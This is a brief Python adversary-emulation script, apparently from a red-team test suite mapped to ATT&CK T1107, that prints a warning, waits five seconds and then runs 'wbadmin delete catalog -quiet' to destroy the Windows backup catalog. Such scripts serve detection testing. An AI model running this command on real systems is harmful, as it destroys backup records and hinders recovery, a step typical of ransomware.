# Name: Catalog Deletion with wbadmin.exe
# RTA: delete_catalogs.py
# ATT&CK: T1107
# Description: Uses wbadmin to delete the backup catalog.
# github idk3669
import common
import time


def main():
    warning = "Deleting the backup catalog may have unexpected consequences. Operational issues are unknown."
    common.log("WARNING: %s" % warning, log_type="!")
    time.sleep(5)
    # Ref. http://support.moonpoint.com/os/windows/commands/determining-backup-times.php
	# Ref. https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/wbadmin-delete-catalog
    common.execute(["wbadmin", "delete", "catalog", "-quiet"])


if __name__ == "__main__":
    exit(main())
